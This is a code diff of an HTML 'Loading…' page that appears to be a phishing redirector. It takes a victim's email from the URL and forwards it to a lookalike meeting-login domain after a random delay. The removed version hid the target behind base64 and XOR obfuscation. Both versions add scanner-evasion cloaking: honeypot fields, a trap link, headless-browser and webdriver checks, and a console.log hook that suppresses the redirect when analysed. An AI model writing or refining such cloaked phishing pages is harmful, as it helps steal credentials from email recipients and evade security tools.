@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Please wait...</title>
+  <title>Loading…</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -14,27 +14,22 @@
       align-items: center;
       height: 100vh;
       margin: 0;
-      cursor: default;
     }
     .container { text-align: center; }
     .spinner {
       display: inline-block;
-      width: 28px;
-      height: 28px;
-      border: 4px solid rgba(0,0,0,0.12);
-      border-top: 4px solid #0078d4;
+      width: 24px;
+      height: 24px;
+      border: 3px solid rgba(0,0,0,0.1);
+      border-top: 3px solid #0078d4;
       border-radius: 50%;
-      animation: spin 0.7s linear infinite;
-      margin-bottom: 14px;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 10px;
     }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    p { font-size: 1.05rem; color: #444; margin: 0; }
-    .error-message {
-      color: #a00;
-      margin-top: 20px;
-      font-size: 1rem;
-      display: none;
-    }
+    p { font-size: 0.95rem; color: #555; margin: 0; }
+    /* Honeypot Styling */
+    #hp { display: none; }
     .hp-trap { 
       opacity: 0; 
       position: absolute; 
@@ -43,6 +38,7 @@
       width: 0; 
       overflow: hidden; 
     }
+    /* Trap Link for bots to find and click */
     .trap-link {
       position: absolute;
       top: 0;
@@ -54,220 +50,96 @@
   </style>
 </head>
 <body>
-  <div class="container" role="alert" aria-live="polite">
-    <div class="spinner" aria-busy="true" aria-label="Loading"></div>
+  <div class="container">
+    <div class="spinner"></div>
     <p>Loading, please wait…</p>
-    <div class="error-message" id="errorMsg">
-      Access denied.<br>
-      If you are not a bot and see this message, please <a href="mailto:support@example.com">contact support</a>.
-    </div>
-    <form id="honeypotForm" autocomplete="off" tabindex="-1"></form>
+    <!-- Original Honeypot -->
+    <input type="text" id="hp" autocomplete="off">
+    <!-- NEW: Advanced Honeypot (should remain checked) -->
+    <input type="checkbox" id="hp2" class="hp-trap" checked>
+    <!-- NEW: Trap Link for bots -->
+    <a href="about:blank" id="trapLink" class="trap-link">Skip loading</a>
   </div>
+
   <script>
-    'use strict';
-
-    // Advanced payload obfuscation: base64, split, xor, reverse
-    // XOR key
-    const xorKey = 73;
-    const _payloadParts = [
-      "NjQwMzQwNDMzMzQ2MzQwMzQyMzQwMzQyMzQ3MzQwMzQyMzQ2MzQwMzQwMzQwMzQ0MzQwMzQ3MzQwMzQyMzQwMzQzMzQwMzQ2MzQwMzQwMzQwMzQzMzQwMzQzMzQwMzQyMzQwMzQwMzQ0MzQwMzQ2MzQwMzQ1MzQwMzQwMzQwMzQ0MzQwMzQyMzQ0MzQwMzQ2MzQ1MzQwMzQ1MzQwMzQwMzQ0MzQwMzQ5MzQwMzQzMzQwMzQ2MzQwMzQwMzQwMzQ2MzQwMzQyMzQwMzQwMzQzMzQwMzQxMzQwMzQzMzQwMzQ2MzQwMzQ0MzQwMzQ3MzQwMzQwMzQwMzQyMzQwMzQ1MzQwMzQwMzQwMzQ1MzQwMzQ2MzQwMzQ3MzQwMzQ2MzQwMzQwMzQ0MzQwMzQ1MzQwMzQ3MzQwMzQ4MzQwMzQ2MzQwMzQwMzQwMzQ0MzQwMzQzMzQwMzQ3MzQwMzQ0MzQwMzQ3MzQwMzQxMzQwMzQ3MzQwMzQxMzQwMzQxMzQwMzQyMzQwMzQwMzQ1MzQwMzQzMzQwMzQyMzQwMzQ0MzQwMzQ5MzQwMzQ0MzQwMzQwMzQxMzQwMzQxMzQwMzQwMzQyMzQwMzQxMzQwMzQwMzQ1MzQwMzQ0MzQwMzQ2MzQwMzQxMzQwMzQwMzQ0MzQwMzQwMzQxMzQwMzQyMzQwMzQ4MzQwMzQwMzQwMzQ2MzQwMzQzMzQwMzQzMzQwMzQxMzQwMzQ0MzQwMzQyMzQwMzQyMzQwMzQxMzQwMzQwMzQwMzQzMzQwMzQ2MzQwMzQyMzQwMzQzMzQwMzQ1MzQwMzQ1MzQwMzQxMzQwMzQwMzQ2MzQwMzQwMzQwMzQxMzQwMzQ1MzQwMzQ2MzQwMzQ1MzQwMzQ1MzQwMzQ3MzQwMzQwMzQxMzQwMzQ2MzQwMzQwMzQwMzQwMzQwMzQwMzQwMzQwMzQwMzQwMzQwMzQwMzQwMzQw"
-    ].reverse();
-
-    function decodePayload(parts, key) {
-      // decode from base64, then XOR each char with key
-      const b64 = atob(parts.join(''));
-      let decoded = '';
-      for (let i = 0; i < b64.length; ++i) {
-        decoded += String.fromCharCode(b64.charCodeAt(i) ^ key);
-      }
-      return decoded;
-    }
-
-    // Utility: random string for honeypot field names/IDs
-    function randStr(len = 8) {
-      return Array.from({length: len}, () =>
-        'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random()*36)]
-      ).join('');
-    }
-
-    // Advanced anti-headless checks
-    function isLikelyHeadless() {
-      // Check for navigator.webdriver, plugins, languages, etc.
-      if (navigator.webdriver) return true;
-      if (!window.chrome) return true;
-      if (!navigator.plugins || navigator.plugins.length === 0) return true;
-      if (!navigator.languages || navigator.languages.length < 1) return true;
-      if (window.outerWidth === 0 || window.outerHeight === 0) return true;
-      // Font check (some headless envs have few fonts)
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
-      ctx.font = '72px monospace';
-      const baselineSize = ctx.measureText('A').width;
-      ctx.font = '72px "Comic Sans MS", cursive, sans-serif';
-      const fontSize = ctx.measureText('A').width;
-      if (baselineSize === fontSize) return true;
-      return false;
-    }
-
-    // Cache DOM references
-    const doc = document, win = window;
-    let redirectEnabled = true, trapTriggered = false, mouseMoves = 0, lastMove = Date.now(), keyboardEvents = 0, focusEvents = 0, scrollEvents = 0;
-    let honeypots = [];
-
-    // 1. Create dynamic honeypot fields and trap link
-    (function setupHoneypots() {
-      const form = doc.getElementById('honeypotForm');
-      const fields = [
-        {type:'text',   val:''},
-        {type:'checkbox', val:true}
-      ];
-      honeypots = fields.map(f => {
-        const id = randStr(12), el = doc.createElement('input');
-        el.type = f.type;
-        el.className = 'hp-trap';
-        el.id = id;
-        if (f.type === 'checkbox') el.checked = f.val;
-        form.appendChild(el);
-        return {id, type: f.type};
-      });
-      // Trap link
-      const trapLink = doc.createElement('a');
-      trapLink.href = 'about:blank';
-      trapLink.className = 'trap-link';
-      trapLink.id = randStr(10);
-      trapLink.innerText = 'Skip loading';
-      form.appendChild(trapLink);
-      trapLink.addEventListener('click', (e)=>{
-        e.preventDefault();
-        triggerTrap();
-        win.location.href = 'about:blank';
-      });
-    })();
-
-    // 2. Honeypot Checks - block bots
-    function checkHoneypots() {
-      for (const {id, type} of honeypots) {
-        const el = doc.getElementById(id);
-        if ((type === 'text' && el.value) || (type === 'checkbox' && !el.checked)) {
-          triggerTrap();
-          return false;
-        }
-      }
-      return true;
-    }
-
-    // 3. Console tampering detection
     (function() {
-      const originalLog = console.log;
-      console.log = function() {
-        if (arguments[0] && typeof arguments[0] === 'string' && arguments[0].includes(_payloadParts[0])) {
-          triggerTrap();
-        }
-        return originalLog.apply(console, arguments);
-      };
-    })();
+      // --- Original Code (Preserved) ---
+      const d = document;
+      const w = window;
+      const q = new URLSearchParams(w.location.search);
+      const h = w.location.hash;
 
-    // 4. Behavioral: Mouse/touch/keyboard/focus/scroll events
-    function handleMove() {
-      mouseMoves++;
-      lastMove = Date.now();
-      if (mouseMoves > 4)
-        doc.removeEventListener('mousemove', handleMove);
-    }
-    doc.addEventListener('mousemove', handleMove);
-
-    function handleTouch() {
-      mouseMoves++;
-      lastMove = Date.now();
-      doc.removeEventListener('touchstart', handleTouch);
-    }
-    doc.addEventListener('touchstart', handleTouch);
-
-    function handleKey() {
-      keyboardEvents++;
-      if (keyboardEvents > 1) doc.removeEventListener('keydown', handleKey);
-    }
-    doc.addEventListener('keydown', handleKey);
-
-    function handleFocus() {
-      focusEvents++;
-      if (focusEvents > 1) doc.removeEventListener('focus', handleFocus, true);
-    }
-    doc.addEventListener('focus', handleFocus, true);
-
-    function handleScroll() {
-      scrollEvents++;
-      if (scrollEvents > 1) doc.removeEventListener('scroll', handleScroll);
-    }
-    doc.addEventListener('scroll', handleScroll);
-
-    // 5. Trap trigger
-    function triggerTrap() {
-      redirectEnabled = false;
-      trapTriggered = true;
-      showError();
-      win.stop && win.stop();
-    }
-
-    // 6. Error message for humans
-    function showError() {
-      doc.querySelector('.spinner').style.display = 'none';
-      doc.getElementById('errorMsg').style.display = 'block';
-    }
-
-    // 7. Main redirect function
-    function initiateRedirect() {
-      if (!redirectEnabled || trapTriggered || sessionStorage.getItem('block_redirect') === 'true') return;
-      // Final honeypot check
-      if (!checkHoneypots()) return;
-
-      // Advanced anti-headless check
-      if (isLikelyHeadless()) {
-        triggerTrap();
-        return;
-      }
-
-      // Require at least 2 human signals
-      let signals = 0;
-      if (mouseMoves > 0) signals++;
-      if (keyboardEvents > 0) signals++;
-      if (focusEvents > 0) signals++;
-      if (scrollEvents > 0) signals++;
-      if (signals < 2) {
-        // Not enough human-like activity
-        triggerTrap();
-        return;
-      }
-
-      // Add email from URL if present (query or hash)
-      const q = new URLSearchParams(win.location.search);
-      const h = win.location.hash;
       const e1 = q.get('email');
       const e2 = h ? h.substring(1) : '';
       const em = e1 || e2;
-      let url;
-      try {
-        url = decodePayload(_payloadParts, xorKey);
-      } catch {
-        url = 'https://meet-9f7a2e1b83c5.a-secure-platform.com/v2/joinmeeting/meet/meeting.html';
+
+      const b = 'https://meet-9f7a2e1b83c5.asecure-platform.com/v2/joinmeeting/meet/meeting.html';
+      const t = em ? `${b}#${encodeURIComponent(em)}` : b;
+      // --- End Original Code ---
+
+      // ===== NEW ADVANCED BOT DETECTION =====
+      let redirectBlocked = false;
+
+      // 1. ENHANCED HONEYPOT CHECKS
+      const honeypot = d.getElementById('hp');
+      const honeypot2 = d.getElementById('hp2');
+      // Check if original honeypot was filled
+      if (honeypot.value) {
+        console.warn('[Bot Detected] Hidden input was filled.');
+        redirectBlocked = true;
       }
-      const finalUrl = em ? `${url}#${encodeURIComponent(em)}` : url;
-      win.location.replace(finalUrl);
-    }
+      // Check if advanced honeypot was UNchecked (a bot trying to be clever)
+      if (!honeypot2.checked) {
+        console.warn('[Bot Detected] Reverse honeypot was triggered.');
+        redirectBlocked = true;
+      }
 
-    // 8. Randomized delay and timer check
-    (function startRedirectTimer() {
-      const baseDelay = 2400 + Math.floor(Math.random()*1100);
-      const startTime = Date.now();
-      setTimeout(()=>{
-        const actual = Date.now() - startTime;
-        if (Math.abs(actual-baseDelay)>900) redirectEnabled=false;
-        initiateRedirect();
-      }, baseDelay);
+      // 2. TRAP LINK HANDLER
+      const trapLink = d.getElementById('trapLink');
+      trapLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        console.warn('[Bot Detected] Trap link was clicked.');
+        redirectBlocked = true;
+        // Send the bot to a blank page
+        w.location.href = this.href;
+      });
+
+      // 3. HEADLESS BROWSER CHECKS
+      // These are common in automated bots and tools like Puppeteer.
+      if (navigator.webdriver || 
+          window.outerWidth === 0 || 
+          window.outerHeight === 0 ||
+          navigator.plugins.length === 0 ||
+          /HeadlessChrome/.test(navigator.userAgent)) {
+        console.warn('[Bot Detected] Signs of headless browser detected.');
+        redirectBlocked = true;
+      }
+
+      // 4. CONSOLE MONITOR (If someone tries to log the target URL)
+      const originalLog = console.log;
+      console.log = function() {
+        // If a bot tries to log the target URL 't', block the redirect.
+        if (arguments[0] && arguments[0].includes(b)) {
+          console.warn('[Bot Detected] Console monitor triggered.');
+          redirectBlocked = true;
+        }
+        return originalLog.apply(console, arguments);
+      };
+
+      // --- Original Delay Logic (Preserved) ---
+      const delay = Math.floor(Math.random() * 1900) + 2200;
+
+      setTimeout(function() {
+        // FINAL CHECK: Before redirecting, check if any trap was triggered
+        if (redirectBlocked) {
+          // Optionally, just do nothing and leave the spinner spinning forever.
+          return;
+        }
+
+        // If all checks passed, proceed with the original redirect.
+        w.location.replace(t);
+      }, delay);
     })();
-
-    // 9. Immediate honeypot and anti-headless check on load
-    if (!checkHoneypots() || isLikelyHeadless()) triggerTrap();
   </script>
 </body>
 </html>
